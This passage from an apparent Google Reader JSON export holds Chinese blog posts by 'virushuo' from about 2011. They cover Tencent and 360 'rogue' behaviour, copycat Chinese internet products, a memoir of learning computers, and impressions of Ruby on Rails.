复制和抄袭</h3>\n复制和抄袭这个流氓行为是可以提上台面的，可以被媒体公开报道，喊打声最多。\n\n<p>某种程度上，腾讯确实压制了中国互联网的创新，他们抄袭复制如此强烈，几年前还是抄国外产品，抄大公司，对方尚有抗衡能力，也影响不大，现在大公司同质化越来越严重，都缺乏创新，于是腾讯掉头回来抄小公司，小公司是没能力抵抗的，损失惨重。这最终对整个互联网环境造成影响。现在，美国互联网始终处于活跃期，几乎每年都有热点出现，中国互联网在政府管制下，本来就有很多领域无法涉及，再加上腾讯不停复制，惨不忍睹，中国互联网没有创新。</p>\n\n<p>从另外一个角度看，公司经营主要是对股东负责，而不是对用户负责，这种做法也就非常正常了。只要被腾讯评估为可以带来利润增长业务，又没有法律限制他做这项业务，做为一家公司就应该去做（对于股东来说，甚至应该叫做有义务去做）。事实上中国不抄袭的互联网公司也不多，新浪搜狐网易金山百度都在抄袭，只不过缺乏腾讯利用IM造成的垄断地位，抄起来并没有腾讯那么成功罢了。目前的微博热潮完全说明这个问题，他们不仅抄袭，而且要抄袭到功能和界面都一样。</p>\n\n<p>在复制这一点上，如果说腾讯是流氓，那中国互联网可以说全都是流氓。只不过有人耍流氓成功，有人耍流氓而不成。</p>\n\n<p>出现这种状况，一方面如前文所述，法律不健全和缺乏行业引导造成了部分公司垄断，另外一方面是缺乏对版权，创新，创意的保护，以至于最先创造出创新的公司无法通过法律保护自己的利益。在美国，如果一家小公司的创意非常成功，大公司会采用收购策略，而不是直接复制一个，复制会遭到法律严惩，在中国，与其收购，不如复制。</p>\n\n<p>这样我们看到了，腾讯流氓的背后原因还是法律问题。</p>\n\n<h3>2 跨省追捕是个敏感区</h3>\n\n<p>腾讯导致跨省追捕这个问题是敏感区，不会被媒体大幅报道，只有特定人群骂的最狠。在媒体上的体现只有一些记者巧妙的通过\"<a href=\"http://www.google.com/search?hl=en&amp;newwindow=1&amp;client=safari&amp;rls=en&amp;q=%E5%BD%93%E5%8A%9E%E6%A1%88%E6%B0%91%E8%AD%A6%E7%9B%91%E6%8E%A7%E4%BB%96%E7%9A%84QQ%E6%97%B6&amp;aq=f&amp;aqi=&amp;aql=&amp;oq=&amp;gs_rfai=\">当办案民警监控他的QQ时</a>\"之类的句子模糊陈述。事实上我们都知道，除了正常协助警方破案，通过这个聊天工具造成的跨省追捕案件很多，某些案件中甚至会有\"打印的QQ聊天记录\"这样的证据出现（同学们，要仔细阅读公开的判决书哦）</p>\n\n<p>这种行为是非常恶劣的，但凭此说腾讯流氓，理由也不充足。原因同样如前所述，一个公司首先要保证股东利益，如果冒着带来利润损失甚至停业的危险来维护用户利益，那是不可能的。（如果真的因此导致停业，也会影响正常用户的利益）。我相信这家公司中任何一个人，都不愿意被迫配合这种事情。但，除了配合，又有什么其他办法？</p>\n\n<p>另外，我也相信，有太多公司试图配合这种事情，甚至愿意充当这种工具，只不过他们没能力做到。<a href=\"http://edu.dbw.cn/system/2010/10/09/052760057.shtml\">微点案中，金山和江民的伪证</a>，也是同类事情，对于违法的事情他们都会去配合，对于仅仅配合提供一些数据，相信更不会有公司拒绝吧。</p>\n\n<p><br>\n360目前被骂做流氓也有两个问题，一个是当年3721开创了流氓软件，另外一个是现在的竞争。</p>\n\n<h3>1 先说当年3721的事。</h3>\n\n<p>前面提到过，当年流氓软件的出现是和cnnic竞争的结果，cnnic以官方垄断资源，试图通过制定国家标准和规范的方式，令自己成为一个唯一合法的通用网址组织。3721做为一家民营创业公司，在官方压制之下，出此下策是无奈的。所谓的流氓软件就是不能正常卸载，或者干扰竞争对手的运行，收集用户信息等等。在那个时代，中国互联网公司少有例外，在我印象中，没干过的应该只有网易，金山，阿里，盛大这四家。这又是一个有趣的现象，这四家中3家依靠网游盈利，网游本身有巨大的粘性，也带来巨大的利润，并不需要那么迫切的占领桌面入口（或者也可以说是天然就占领了桌面）。可见当时中国互联网竞争之惨烈，如果你不做流氓软件，又没有足够的粘性，那么就意味这被对手侵占市场份额，甚至消灭。</p>\n\n<p>3721过去的流氓行为被人们继续套在现在的360身上。当年周创造360时，号称是要终结流氓软件时代，这句话是06年说出来的，当时很多人是不信的，现在看来，这件事周鸿祎确实做到了，过去无数的工具条，下载站捆绑安装，无法卸载等都几乎绝迹。一些人对360嗤之以鼻，但去看看普通用户，360确实帮他们带来了好处，让他们的计算机更好用。这是事实，这也是360装机量能在几年之内达到如此巨大数量的原因。</p>\n\n<p><br>\n在目前看来，我们至少可以谨慎的说，没有证据表明360有流氓行为。有人怀疑360也会造成跨省追捕等等，不过事实上这种案例也没有被发现。做为软件的特质来说，因为360没有用户之间的交流功能，360手里掌握的用户信息确实比QQ少的多，也就没法截获证据，至于监控计算机中全部文件，那需要占用很大的资源，并不现实。</p>\n\n<p>3721虽然很流氓，但有一点，周鸿祎做到了，他没有弹过广告框，哪怕是后期利润紧缩的时候也没这么干过，而其他家的插件工具条都干过这事，搜狗输入法曾经号称绝不弹出，但在奥运会期间弹出过新闻，最近据说又在弹出\"微门户\"（这是在学习QQ的弹出新闻吧，但QQ弹出用户是喜欢的，输入法弹出新闻确实不合适）。这一点我们可以认为周鸿祎是有底线的，也可以认为他是聪明，有远见的。</p>\n\n<p>到目前为止，360一些事情都做的很巧妙，确实把决定权给了用户（虽然他们引导用户去做他们希望用户做的事情），也确实没有捆绑安装，不能卸载等等流氓软件行径。但很多人仍然怀疑360在未来的某一天会突然做坏事。这种怀疑是很好的，但不应该只怀疑这一家软件公司，而应该怀疑所有的公司，所有的产品，甚至应该怀疑...</p>\n\n<h3>2 再说竞争问题</h3>\n\n<p>在我看来，周鸿祎如战神转世，他创业的10年就是战斗的10年，一场仗接一场仗的打，无论是cnnic这种官办三产还是瑞星这种有能力制造冤案的企业，都打了过来，并且胜利了。</p>\n\n<p>前文说过法律缺失的问题，在一个没有法律保证的市场上，撕开垄断只能靠暴力。垄断是一种暴力，反垄断只能更暴力。事实上就算通过法律解决，法律本身也是一种暴力。暴力的姿势总不会太好看。</p>\n\n<p>360对金山这场仗，被很多金山的人称作流氓，事实上金山在微点案中的不光彩表现，金山网盾捆绑傲游安装，毒霸的虚假宣传，金山MSN防护盾对用户的骚扰...哪个都很流氓。金山没资格骂360流氓。这和前面说腾讯的情况一样，很多公司不是不流氓，是连流氓的资格也没有。</p>\n\n<p>写到这里，大家应该明白了所谓的流氓背后是什么，导致流氓的原因是什么，中国的问题都很相似，这些问题甚至都用一句话就可以概括，可惜这句话里面全是敏感词。</p>\n\n<p>流氓的背后，是敏感词。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370756365",
    "timestampUsec" : "1313370756365042",
    "id" : "tag:google.com,2005:reader/item/43011701e803f81c",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "随便" ],
    "title" : "一样不一样",
    "published" : 1296105239,
    "updated" : 1296960316,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/01/27/post_76.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>最近拜移动和电子商务泡沫春风，行业发展热火朝天，颇有上一次大泡沫崩溃之前的景象。这次和以往不太一样的是，山寨的速度比以往快的多，不仅个人创业团队以更快的速度去山寨，大公司也不落后。同时大家还都喜欢喊着中国用户特点和国外不一样。说起来一样不一样，这倒是一个有意思的话题。</p>\n\n<p><strong>一 用户特点一样吗？</strong></p>\n\n<p>这问题其实毫无意义，拿着案例说中国用户和国外不一样，所以要如何如何的，基本都是眼界不够的结果。比如说，新浪这种新闻门户为什么是这样？这并不是因为中国用户和外国不一样，而是因为新浪就做成了这样。最后结果就成了做门户只能这样。当时的历史时期把风格奠定了，以后也就不会再改了。与其说中国用户特点决定了新浪，不如说新浪造就了一批适合他们的用户。</p>\n\n<p>同样的讨论还有，新浪微博做成这样是不是更适合中国用户？我看也未必，因为在新浪微博之前有个叫饭否的完全版twitter拷贝猫，人家活的很好，用户量巨多，用户感情前所未有的深。如果不是被有关部门关了，恐怕现在也没有新浪微博什么事。同样的道理，并非新浪微博的做法更适合中国用户，只是一个这样的产品造就了这批用户，并不是中国用户就适合特定一类的产品。</p>\n\n<p>如果非要说不一样，中国用户和外国用户确实有很多区别，语言不一样，生活习惯不一样，但这又怎么样了？改革开放初期可口可乐到中国赔的要死，人们都说中国人喝不习惯这东西，还是咱的山海关北冰洋顺口。现在是什么情况？可乐是中国最知名的饮料，山海关北冰洋偶尔可以在小店买到，大家都当看到古董一样激动。同样的情况也发生在麦当劳之类的快餐身上。</p>\n\n<p>其实就算是中国人和美国人同样有那么多相同之处。比如说，都要吃饭，都怕麻烦，都是灵长目下的一种生物。如果非要说不同，就算中国人也有那么多不同。比如，汉族听不懂藏语，北京人听不懂上海话，长三角不吃辣，四川两湖不吃辣活不了，电信和联通网络之间的访问速度比访问美国还慢。那么我们是否应该对上海人和北京人区分开，做不同特点的产品？</p>\n\n<p>某些情况下也有道理，但大部分情况没有道理。事实上，就算这种生活中的情况也有所改变，比如，上海的湘菜馆川菜馆都很多，去吃还要排队。全球一体化日益严重，人也越来越相似了。</p>\n\n<p>说回互联网这事，最重要的两个因素，大家是一样的：1 大家使用同样的计算机 2 大家所访问的网络基于同样的 TCP/IP协议，并且互通。在这两个因素之下，所谓懂中文，只是百度这种公司一厢情愿的宣传口号，当不得真。</p>\n\n<p><strong>二 微博的乱战，LBS的乱战，kik的乱战</strong> </p>\n\n<p>山寨的速度变快，大概是从微博开始的。上一个热潮是blog时代，三大门户加入战争是blog火了很多年之后的事，而twitter火了1年之后，门户们就加入了战团，到foursquare火的时候，半年之后大家就参战了。kik火了不到两个月，大家就冲进来当作了下一个增长点。</p>\n\n<p>事实上，这几个东西的门槛是越来越高的。微博需要有智能手机才好玩，LBS必须有智能手机且需要有GPS。这些山寨一下尚且可以理解。但kik的山寨实在是太离奇了。</p>\n\n<p>我在twitter发过一条推，问kik和飞信到底有什么区别，除了后者是移动官老爷做的，没准备好好做东西之外。答案千奇百怪。事实上，我要表达的意思是，kik在中国绝对没有短信方便。这才是真正的中国和外国用户不一样的地方，但到了这个时候，似乎人们都只关注了\"中国人和外国人都用手机\"这件事，忘记了其他的。也不去认真研究一下为什么kik在美国会火起来，只看了个\"迅猛增长\"的报告就开始山寨。之后就是下级忽悠上级，一直忽悠到大老板或投资人。</p>\n\n<p>kik为什么火，四处都有分析，比如最简单，真实网络，跨平台，之类，但这都不在点子上。真正的原因我认为是：短信这东西对美国人来说不友好。</p>\n\n<p>经过和在美国以及曾经在美国生活的朋友确认，我概括出来几个主要原因：</p>\n\n<p>1 英文140字能表达的意思太少了，非常鸡肋，甚至比不上中文70字<br>\n2 美国短信太贵，要$0.2一条，相比之下打电话便宜太多了<br>\n3 美国固话非常方便，手机网络反而不怎么样<br>\n4 长期不怎么发，最后就成习惯了</p>\n\n<p>在美国kik是解决了需求的，不限制文字长度，方便又便宜的工具是很好的，从美国的角度看，kik是介于邮件和IM之间的东西。在中国，这个东西叫做短信，某种情况下也可以叫做手机QQ。</p>\n\n<p>这个恰好就是前面说的那种的反例，中国用户和美国用户确实不一样，所以要火起来，原样照搬是不行的。必须得做点变化。</p>\n\n<p>可惜，大家都忙着山寨，没人创新。我最近看到的很多东西都是这样，分不清边界，搞不清哪些是应该改变的，哪些是应该学习的。中国用户早就不是受传统习惯影响的中国用户了，甚至中国人也不再是受传统习惯影响的中国人，这30年，中国的变化尤其大，我们的行为模式比西方还西方。只看着表面情况，说中国用户习惯不一样，所以要如何如何，这就是自欺欺人了。</p>\n\n<p>最后，补上一句话：\"<a href=\"http://en.wikiquote.org/wiki/Marshall_McLuhan\">我们造就工具，随之工具造就了我们</a>\"。这句话来自Marshall McLuhan话，我最早从<a href=\"http://twitter.com/hengdm\">端木恒</a>那听到，大受冲击。这就是我想说的。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370755885",
    "timestampUsec" : "1313370755885204",
    "id" : "tag:google.com,2005:reader/item/5a86a738ef2b739f",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "胡言乱语" ],
    "title" : "好奇的意义",
    "published" : 1296884397,
    "updated" : 1296960087,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/02/05/post_77.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>注：这不是一篇回忆录，本来是应邀而作。后来我决定不放在那本书里面，因为那对我并没意义。我不是一个努力-吃苦-进步的范本，也不具备影响同龄人的意义。所以，就放这里给大家看吧。</p>\n\n<p>我仍认为，到我们这个年龄的人，无法改变同龄人，也无法影响同龄人，要说用自己的经历来帮助比自己小几岁的人，那太自负了。80后甚至90后很多人做的比我们更好，这是时代和信息传播方式变化的结果。他们有自己的道路。</p>\n\n<p>我们只能把自己的经历写出来，供同龄人培养下一代的时候参考，这是唯一的价值。</p>\n\n<p>============================<br>\n在我看来，人类唯一能被称为天赋的东西，就是好奇心。除此之外，一切品质都可以后天弥补或训练所得。好奇心是一种随着年龄的增加，只会磨损，很难增强的东西，所以我认为这是宝贵的天赋。如果从我开始学计算机算起，至今已经有23年了，但我大学毕业参加工作至今只有8年。这2个数字的差距巨大，看起来好像是写错了，当然，实际没有错。回忆这20多年，我的每一个重要的转折点，都和好奇心有关。</p>\n\n<p>好奇心这种天赋，对每个人是平等的，小孩子好奇心都很强，但在成长中却逐渐消磨。不敢好为人师，今天我写下自己曲折的故事，并不认为能给我的同龄人什么帮助，他们早有了自己的道路和想法，我更希望给比我小的多的孩子们一些启示，更希望给我们这一代已经做了父母或是将要做父母的人一些启示，这可能更加有意义。</p>\n\n<p>我出生在79年年末，确切来说已经算一个80年代的人了，比70初的人幸运，我在86年就第一次看到了计算机。在我的小学课程上。</p>\n\n<p>为响应小平同志的\"计算机教育从娃娃抓起\"的号召，天津有几个小学开设了计算机课程，我的小学是其中之一。二年级的时候就开始了第一节计算机课，老师带我们到机房，整个屋子弥漫着一种塑料外壳被芯片的热量烤出来的特殊味道，我至今仍然能想起这种味道，这种味道和我记忆中的计算机是相关的。 </p>\n\n<p>第一节计算机课之后，我就彻底迷上了这东西。对那时候的我来说，计算机的魅力在于可以对输入的动作产生回应，这是一种非常奇妙的感觉，在此之前，我没有见到过能对我的动作有反馈的机器。这种感觉让我产生了巨大的好奇，非常希望知道如何控制它，如何使用它，背后还有什么秘密。这种好奇的力量吸引我投入很多精力去学习和了解计算机。今天看来，那简直不能算作计算机，那台Laser310，使用Z80的芯片，没有操作系统，只有rom中的basic可以用来编程。</p>\n\n<p>在小学的时间里，我在Laser310上学习basic，写了很多程序，一些还发表在报刊上。后来参加奥林匹克信息学竞赛，可惜最好成绩只在天津市拿到二等奖，没能进入国家队。后来父母买了一台中华学习机给我，这是重要的一步。中华学习机是克隆的Apple II，同样使用6502的cpu，软件也可以通用。当年价格很贵，这是那时候我家最贵的东西了。买这台机器花费了家里的大量存款，但父母没有为此产生任何争议。如今想起来，这是我人生最早的转折点，我的父母果断支持了我的爱好，虽然当时我还不到10岁，虽然这是一个和考试分数完全无关的东西。</p>\n\n<p>我玩中华学习机达到的最高峰，是用6502汇编写了一个屏幕卷轴引擎用来做游戏。因为basic速度太慢，6502汇编可以显著的提升速度，这是小学六年级的事情。</p>\n\n<p>这个程序完成之后，我突然陷入一段不知道应该做点什么的空虚期，6502能做的事情基本已经知道了，不知道应该再做点什么。这是1992年，我上初中了。如果在世界范围内看这段时期，正是计算机技术发展最快的一段时期，但国内缺乏直接的方式去了解，至少对于一个初中生来说很难有渠道了解这些。</p>\n\n<p>1995年，我上了高中，x86架构的计算机价格终于便宜了一些，爱好者们开始自己买来零件组装x86兼容机，不需要再买昂贵的IBM原装机了。天津鞍山西道成了电子一条街（就好像北京的中关村），这条街上能买到一台真正计算机所需要的全部零件，软件，当然还有各种盗版光盘。我在店里试了几次368，觉得非常动心。价格虽说便宜了，一台差不多的计算机也要1万块钱。那时候天津地段不错的房子只要几百块钱一平方米。这笔钱太多了，我实在没办法和家里提出这个要求，何况中华学习机才用了几年...</p>\n\n<p>不能买计算机，那么就读书吧。天津图书馆试验性的搞了一个对社会开放的计算机图书馆，我去办了个图书证，借书看。至今我认为对我影响最大的那本书，<code>就是在那个时候读到的。我的高中是一所市重点中学，也有计算机课，但课程内容非常简单，只是普通的操作。以我当时读到的书的水平，自然是看不起这种课程，不过这总是一个能实际操作的机会，不可放过。计算机课老师的水平很低，甚至对计算机有点奉若神明的感觉，我想对于她来说，这只是一个谋生的饭碗，她只是机械的重复一些语言和动作，并不理解计算机是什么。所以她在上面讲课，我就在下面抓紧时间尝试在书上学会的东西。</code></p>\n\n<p>好景不长，终于有一次被发现了。她惊奇的发现有个学生竟然不是和别人一样偷偷动计算机玩游戏，而是在搞一些她完全看不懂的东西，就很生气。现在回想起来，大概是紧张胜过生气，因为在她理解的范围之外，她很怕我把计算机弄坏没法交代。后果自然是上课时不让我随便碰计算机了。</p>\n\n<p>那段时间真是很难受，睡觉都在辗转反侧的想到底怎么办。结果当然是没办法。这样过了一段时间，这事情被我妈妈发现，并猜出来了原因。父母只问了我一个问题，如果咱们买一台，你懂不懂，买来配件自己能不能装起来？我说没问题。 随后他们又是毫无争议的决定买一台。父母把家里的存折一通折腾，总算是凑够了钱，赶在了春节之前，总算把一台486搬回了家。</p>\n\n<p>这台计算机伴随我度过了之后的几年时间，在这上我学会了C和C++，学了点8086汇编，当然也玩了不少游戏。后来又买了一个9600的modem开始上fido的bbs，搞的家里电话费暴增。fido虽然是很简单，可毕竟是一种网络，人们开始聚集起来，也能知道更多的信息，从这个年代开始，我再也没有过前面几年那种\"没有东西可学\"的感觉。fido大概是中国最早网络社会，在这里我认识了很多朋友，也有很多争吵，看到了很多好的技术资料。 </p>\n\n<p>这时候，互联网的大潮已经很近了。我高三的时候，天津有了第一个商用互联网节点，不过价格高达30多块钱一小时。去看看互联网，我这个奢侈的要求仍然被父母支持了。互联网来了，这算是我人生最大的转折，从此之后，无论我的工作和知识结构，还是获取信息的方法，或是人的关系，都为之改变。</p>\n\n<p>高三是我很矛盾的一年，一边要忙着高考，另外一边又有无数的新鲜东西可以体验，fido上的一些网友已经开始尝试互联网创业，我认识的一个天津网友干脆放弃了高考到了一家游戏公司去做游戏...太多的变化就在98年那一年发生。</p>\n\n<p>要不要干脆我也放弃高考算了？现在我已经想不起来当时和父母的对话了，只记得大概的意思是，大学是一种经历，你可以不在乎它，但是如果这时候不上，以后很难有机会再上。这个观点说服了我，不过父母同意我只要上一个一般本科就可以，不是必须上重点大学，至于上什么大学，什么专业，都由我自己选择，当然如果想考计算机系，就要很努力，那是当年最热门的专业。这给了我无比的自由，我所上的高中教学质量还不错，历年高考本科率已经超过90%了，因此一般本科这个标准非常低，甚至意味着别人在努力拼命想考一个更好一点的大学时，我可以悠闲自得的在家里玩计算机。至于上计算机系，我没想过。</p>\n\n<p>不愿意上计算机系，是一个非常傲慢的理由，我觉得他们教材水平太差，跟不上时代。某种意义上这种说法是对的，但基础真的非常重要。缺少了这些专业训练的结果是，到今天，我已经31岁了，仍然时常会觉得力不从心，要在业余时间读国外大学计算机本科教材。不过这也没什么可后悔的，我也有自己独特而有意义的经历。</p>\n\n<p>于是我的高考很轻松的考了一个足够上一般本科的分数。报志愿虽然没有写计算机系，但还是选了自动化专业，这样算相关专业，将来找工作也不会太麻烦。学校选了一个建筑院校，因为这个学校的自动化专业是智能建筑方向，选这个学校的原因是接触软件时间长了，去看看软件和真正现实中的设备配合起来一定很有意思。做为一个喜欢搞行为艺术的爱吹牛的人，我只写了这么一个志愿，就把表格直接交了。当然后来学校老师觉得这样做太离谱，打电话给我父母，让他们把表拿回去添好了二三志愿再交回来。</p>\n\n<p>当然最后的结果确实是第一志愿录取了。于是我毫无悬念的到了这个建筑院校开始学电气工程自动化专业。</p>\n\n<p>一开始就为了随便混个学历，所以上学也就很不认真，只求经历，不求效果。但是过了很多年之后，突然发现这四年大学还是给我留下了很多东西，这些足够弥补没有上计算机专业的遗憾。甚至得到的可能更多一些。</p>\n\n<p>在大学中，我学到很多有意义的东西，至少有这么几个：</p>\n\n<p>1 项目管理。建筑工程应该算是人类历史最悠久的工程，因为其一旦制造就难以修改，所以建筑工程的管理非常有特点。相对于我喜欢的软件，则是另外一个极端，软件工程是最新的工程类型，而且容易修改。这两者之间区别甚大，但是在项目管理的本质上又有颇多相似之处。用建筑工程管理的思路来看软件，会有一些不同的感觉。在工作这些年中，我自觉项目管理做的不错，完成度和时间控制好过很多项目，我使用的很多思想是来源于建筑工程的。</p>\n\n<p>2 要了解具体实现。四年大学中有三年要在图板上画图，我非常不理解在CAD如此发达的时代为什么还要用图板。后来才理解知道具体实现的意义。除此之外，我们还学了很多课，要知道建筑结构，知道相关专业的工作方法等等。这些具体的实现方法会改变设计的思路。对于软件也一样，要知道更多的技术细节，才能对整体有把握。反观现在的行业，很多产品经理只是凭想象做事，完全不知道实现产品的技术和设计。这大概只有在新兴行业才能发生的事，我是不相信这样能做出来好产品。</p>\n\n<p>3 见过了大场面。建筑工程都是大场面，用非常多的人，非常多的工种，非常多的机械和原材料互相配合，最终完成一个产品。这些东西都是在现实中真实存在的，有过参与这种工程的经历，会更加理解如何使用资源。</p>\n\n<p>4 多学点东西，哪怕看起来没用。我们专业本来应该只管和电气设备有关的东西，但事实上学的相关专业东西很多。到实际做起来才发现，一些看起来自己完全用不到的东西，对实际工作有非常大的帮助。不同专业思考问题的方法不一样，熟知对方的思考方式，才容易相互配合，也能让自己专业的东西缺陷更少。这对于整个工程是很重要的。</p>\n\n<p>因为没把太多心思放在专业学习上，大学时候我倒是省出了很多时间，可以用来看我想看的书，或是尝试有意思的技术。而且竟然还创业了两次。</p>\n\n<p>第一次创业是刚上大学的时候，那时候完全觉得这专业没什么可学的，将来反正我也不会做，于是就找点其他的事情试试看。就和几个朋友一起试图做网络游戏，这是98年的事情，后来当然失败了。因为光会写点程序，没有人策划游戏，没有人做设计，也没有营销的办法，这也让我知道了一个拥有不同角色团队的重要性。</p>\n\n<p>第二次创业是大四的时候，那时候快毕业了，有朋友问我能不能做GSM网络的自动测试仪表，这个系统类似于工业控制系统，与其说是软件，不如说用软件来包装自动化的系统。这个算我的专业，当然可以做。这个系统做了2年多，也卖出了一些，我不仅写了程序，还去给用户做过培训，也是一段难忘的经历，这是我第一次真正接触最终用户，知道他们的需求，知道他们如何使用软件。最后这个公司仍然失败了，失败的原因是团队散架了，负责销售的人认为自己功劳最大，偷偷去和别人合作，于是团队就无法继续了。这次之后我知道了选择一个稳定团队，在前期把利益分配公平的重要。</p>\n\n<p>很幸运，我在大学毕业一年之内，就明白了这两个本来需要在后面几年吃很多亏才能明白的道理。</p>\n\n<p>后来的经历似乎简单了很多，去一家做远程教育的公司做程序员，后来做技术部经理，后来离开换了一家公司，再后来又创业。这段时间仍然学到了很多东西，但更多的变化是增加眼界和积累经验，最基础的东西反而提高不多。现在反省这段时间所做的事情，因为觉得\"值得做\"而做的事情太多，而\"非常喜欢做\"的东西太少。有很多原因导致这种状态，但最根本的是对新东西的好奇心不够，否则一定会找到新鲜的\"非常喜欢做\"的事情，而不是停留在解决\"值得做\"的问题。这段时间中，我错过的最大机会就是移动设备相关的，直到2009年底我才意识到这个领域的重要。</p>\n\n<p>从苹果在2007年发布第一代iTouch的时候，我周围一些朋友就开始研究这个设备。可惜我在很长时间内并没有看出来这个设备改变世界的能力。以至于在下面的两年内都没投入时间关注。我时而回想，如果我也在2007年就专注于这个可能是未来10年最有活力的领域，那么之后的道路选择应该都会有所不同了。不过还好，晚了2年之后，我终于意识到了这个领域重要，也做了一些补救，算是勉强跟上了时代。</p>\n\n<p>回顾我的全部经历，其实在很多年前，主要的道路就已经确定。后来的这些年中虽然有不同的工作，不同的经历，也有困惑，迷茫，找不到方向的时候，不过都不是主要问题。对我影响最大的，仍然是20多年前被好奇心带领走向计算机的世界，由好奇心带领在这个世界中寻找方向，走向喜欢的领域，学习更多的知识。在这20多年中，有一多半时间是靠父母支持才得以完成的，这非常重要。我见过很多因为被家庭确定了方向，走上了自己不喜欢的道路的人，他们有的耽误了很多年时间，又回到自己喜欢的领域，有的则再也没有机会。对我们这一代人来说，我是幸运的。现在我周围的朋友已经逐渐开始有了孩子，做起了父母，希望他们能给下一代更多的支持，允许他们按照自己的想法去探索世界。</p>"
    },
    "author" : "virushuo",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://feeds2.feedburner.com/virushuo",
      "title" : "demo@virushuo",
      "htmlUrl" : "http://blog.devep.net/virushuo/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1313370754957",
    "timestampUsec" : "1313370754957664",
    "id" : "tag:google.com,2005:reader/item/8146d6d6c1d1017a",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "偶尔谈谈技术" ],
    "title" : "关于ruby/ror我的体验和看法",
    "published" : 1300865140,
    "updated" : 1300865398,
    "alternate" : [ {
      "href" : "http://blog.devep.net/virushuo/2011/03/23/rubyror.html",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>这几天在twitter上说到不少ruby到底好不好的事情，总结一下，写了这个blog。</p>\n\n<p>今年年初开始我打算深入体验一下ruby on rails，对我来说，已经很多年没有接触\"新语言\"了。在这个深入体验开始之前的几年，也有若干次浅尝辄止，基本都是玩了几下，觉得要学的东西真多，用PHP顺手写一个也很简单嘛，就放弃了。</p>\n\n<p>但我想一个东西迅速风靡世界一定是有原因的，就算我最终不去真正使用它，弄清楚背后的原因也是值得的。于是我就放下了老程序员的心态，像一个初学者一样从最基本的文档看起，尝试各种大家称赞的项目，搞不懂的地方就去问熟悉ruby的人，不仅 问如何实现，还要问\"为什么会这样\"，\"过去什么样\"，\"其他语言解决某个问题的方法在这里如何对应\"。几个月下来，虽然我还没能用ror真正开发一个完全独立的项目，但总算是有了一个全貌的概括性了解，也知道了历史和文化，体会了社区的氛围。这个时候，我想大概是可以 对rails发表一些评论了。</p>\n\n<p>在这一次尝试之前，我最担心的事情是\"性能问题\"，现在看来这是一个伪问题，首先ruby的性能并没有这么差（前几年确实不太好，不过现在已经很好了），其次，用来做一个网站应用，无论是什么语言，最后都要依靠缓存和分布来解决，也就是说最终都要依赖于正确的系统架构，而不是语言本身的性能，最后，就算是性能真的差又完全不可解决的问题，完全可以用效率更高的语言来写，把处理的结果通过各种通讯方式交给ruby就是了。在计算机硬件发展到今天这样，性能问题大多不存在，只有架构师水平的差距。我见过很多用了几十台机器的系统但抗不住几十万的负载，这能怪语言和平台本身的性能差吗？</p>\n\n<p>在所有关于ruby优点中，我唯一不能认同的是\"学习曲线平缓\"，事实上，ruby的学习难度比较高，确实远远高于PHP，要说平缓，大概是相对于J2EE的平缓。我相信这是很多对ruby误解和攻击的来源，从表面上看起来，要学会ruby尤其是ror，至少需要理解设计模式，知道服务器系统的运作方式，甚至需要熟悉操作系统，要用好ror，更需要接触各种项目和各种标准，这些都需要花去很多学习时间。同时配合的还有各种测试工具，部署工具，虽然不是必须，但最终还是要学的（这里我还欠缺很多呢）。我曾经开玩笑说ruby社区的人破坏了英语的纯粹性，因为他们fork新项目太容易，大家都喜欢创造各种开源项目，直接符合功能的名字都被用光了，于是只好用各种奇怪的相关的英语单词，以至于搜索很多英文单词竟然会找出来ruby的项目。这些东西直接塞给一个初学者确实有很大的压力。ruby on rails的Getting start又太停留在表面，勉强算是尝鲜，距离真正实用差的太远。相对来说，PHP就简单多了，页面直观对应在PHP文件上，什么都不用懂也能写（当然写好也很不容易），这造成的结果就是谁都可以懂PHP，但不是谁都能懂ruby。人们为了掩盖学习的痛苦，就容易去攻击对方无用。在我这次下决心深入学习之前，我也觉得PHP最好，记得之前某次尝试的时候 @rainux 跟我说，刚刚上手是很难感觉到ror的好处，需要持续用一段时间才会慢慢发现。</p>\n\n<p>ror在架构和开发流程管理也坚定的支持了很多理论，比如MVC，比如敏捷，比如TDD...这些同样增加了学习成本，当然也增加了被攻击的接口，比如：TDD太扯淡了，所以ror也扯淡。或者：我最讨厌敏捷了，所以也讨厌ror。实际上，敏捷和TDD本身都没错，他们都有成熟的方法论和实践，有足够好的工具配合，能解决很多问题。如果不认同这个，只能说是开发和项目管理经验太少，没碰上过复杂问题。有错的是对敏捷和TDD的错误鼓吹，两者不能混在一起。</p>\n\n<p>另外一个常见说法是寻找ruby的大流量项目案例。但其实寻找ruby开发的\"top项目\"没意义。DHH和37s创造的都不是适合所有人的产品，他们只愿意在某一领域做到最好。不是所有人都有兴趣创造亿级别产品，何况也没几个人真能做成。对大部分项目，千万是一个很好的级别，那是ror最佳实践领域，而在现实中，大部分项目能做到100万pv，已经算了不起了，想亿级别pv的技术方案未免过早了。</p>\n\n<p>在组织技术团队的问题上，流行语言的难度是差不多的，10个人的团队任何语言都很容易组织起来，但换个角度看，任何语言也很不容易组织10个人的团队，只不过难的方法不一样。A语言可能是找人难，一周就收到1份简历，B语言可能是鉴别难，一天收到200份简历，看都看不过来。其实最难的事情是组织一个10个人的靠谱团队，这个团队用什么语言相对于寻找10个靠谱的人的难度可以忽略不计。</p>\n\n<p>选择一个语言，并不是选择语言本身，同时也是选择